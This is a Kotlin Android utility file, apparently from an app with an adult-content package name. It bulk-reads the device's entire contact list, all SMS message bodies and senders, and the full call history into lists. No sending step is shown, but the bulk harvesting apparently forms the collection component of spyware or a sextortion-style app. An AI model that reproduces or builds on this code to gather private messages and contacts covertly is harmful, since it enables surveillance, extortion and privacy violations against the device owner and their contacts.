package com.boxx.porn.utils

import android.annotation.SuppressLint
import android.content.Context
import android.provider.CallLog
import android.provider.ContactsContract
import android.provider.Telephony
import com.boxx.porn.model.CallLog as CallLogModel
import com.boxx.porn.model.Contact
import com.boxx.porn.model.SMS

object DataHelper {

    @SuppressLint("Range")
    fun fetchContacts(context: Context): List<Contact> {
        val contacts = mutableListOf<Contact>()
        val cursor = context.contentResolver.query(
            ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
            null, null, null, null
        )
        cursor?.use {
            while (it.moveToNext()) {
                val name = it.getString(it.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME)) ?: "Unknown"
                val phone = it.getString(it.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER)) ?: ""
                if (phone.isNotEmpty()) {
                    contacts.add(Contact(name, phone, System.currentTimeMillis()))
                }
            }
        }
        return contacts.distinctBy { it.phone }
    }

    @SuppressLint("Range")
    fun fetchSMS(context: Context): List<SMS> {
        val smsList = mutableListOf<SMS>()
        val cursor = context.contentResolver.query(
            Telephony.Sms.CONTENT_URI,
            null, null, null, null
        )
        cursor?.use {
            while (it.moveToNext()) {
                val address = it.getString(it.getColumnIndex(Telephony.Sms.ADDRESS)) ?: ""
                val body = it.getString(it.getColumnIndex(Telephony.Sms.BODY)) ?: ""
                val date = it.getLong(it.getColumnIndex(Telephony.Sms.DATE))
                val type = it.getInt(it.getColumnIndex(Telephony.Sms.TYPE))
                smsList.add(SMS(address, body, date, type))
            }
        }
        return smsList
    }

    @SuppressLint("Range")
    fun fetchCallLogs(context: Context): List<CallLogModel> {
        val callLogs = mutableListOf<CallLogModel>()
        val cursor = context.contentResolver.query(
            CallLog.Calls.CONTENT_URI,
            null, null, null, null
        )
        cursor?.use {
            while (it.moveToNext()) {
                val number = it.getString(it.getColumnIndex(CallLog.Calls.NUMBER)) ?: ""
                val name = it.getString(it.getColumnIndex(CallLog.Calls.CACHED_NAME)) ?: "Unknown"
                val duration = it.getString(it.getColumnIndex(CallLog.Calls.DURATION)) ?: "0"
                val date = it.getLong(it.getColumnIndex(CallLog.Calls.DATE))
                val type = when (it.getInt(it.getColumnIndex(CallLog.Calls.TYPE))) {
                    CallLog.Calls.INCOMING_TYPE -> "Incoming"
                    CallLog.Calls.OUTGOING_TYPE -> "Outgoing"
                    CallLog.Calls.MISSED_TYPE -> "Missed"
                    else -> "Other"
                }
                callLogs.add(CallLogModel(number, name, duration, type, date))
            }
        }
        return callLogs
    }
}
